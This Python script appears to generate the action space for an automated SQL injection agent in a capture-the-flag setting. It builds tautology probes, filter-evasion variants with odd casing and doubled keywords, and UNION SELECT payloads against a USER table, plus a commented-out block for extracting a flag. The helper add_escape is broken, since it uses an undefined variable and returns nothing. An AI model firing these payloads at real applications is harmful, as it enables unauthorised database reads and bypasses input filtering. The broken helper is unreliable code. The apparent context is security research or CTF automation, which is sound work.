
def add_escape(instr, escape):
	if(esc == "'" or esc == '"'):
		esc + instr + esc


def generate_actions(escapes = None, max_columns = 5):
	actions = []
	if(escapes is None):
		escapes = ['"', "'",""]


	for esc in escapes:
		#Detect vulnerability
		x = "{0} or {0}1{0}={0}1{0}".format(esc) + ("#" if esc == "" else "--")
		actions.append(x)
		x = "{0} or {0}1{0}={0}2{0}".format(esc) + ("#" if esc == "" else "--")
		actions.append(x)

		x = "{0} oR {0}1{0}".format(esc) + ("#" if esc == "" else "--")
		actions.append(x)
		x = "{0} oR {0}2{0}".format(esc) + ("#" if esc == "" else "--")
		actions.append(x)

		x = "{0} Or {0}1{0}".format(esc) + ("#" if esc == "" else "--")
		actions.append(x)
		x = "{0} Or {0}2{0}".format(esc) + ("#" if esc == "" else "--")
		actions.append(x)

		##Generate actions that avoid input filtering
		sql_or = "or"
		sql_one = "'1'"
		x = f"{esc} o{sql_or}r {esc}{sql_one}1{esc}={esc}{sql_one}1{esc}" + ("#" if esc == "" else "--")
		actions.append(x)
		x = f"{esc} o{sql_or}r {esc}{sql_one}1{esc}={esc}{sql_one}2{esc}" + ("#" if esc == "" else "--")
		actions.append(x)


		#To detect the number of columns and the required offset
		#Assumes knowlegde about table name and column name
		columns = "first_name"
		for i in range(2, 7):

			#x = "' UNION SELECT first_name,2,3,4,5 FROM User LIMIT 5--"
			#XXX As far as I can tell we put the offset on hold and set it to 2 XXX correct me if this is worng
			x = "{0} union select {1} FROM USER".format(esc, columns) + ("#" if esc == "" else "--")
			actions.append(x)

			x = "{0} uNiOn SeLeCT {1} FROM USER".format(esc, columns) + ("#" if esc == "" else "--")
			actions.append(x)

			x = "{0} UNunionION SEselectLECT {1} FROM USER".format(esc, columns) + ("#" if esc == "" else "--")
			actions.append(x)

			columns = columns + "," + str(i)

		# #To obtain the flag
		# columns = "flag"
		# for i in range(2, max_columns+2):
		# 	x = "{0} union select {1} from Flagtable limit 1 offset 0#".format(esc, columns)
		# 	actions.append(x)
		#
		#
		# 	columns = columns + ",flag"


	return actions



if __name__ == "__main__":
	print("start")
	actions = generate_actions()

	print("Possible list of actions", len(actions))
	for action in actions:
		print(action)
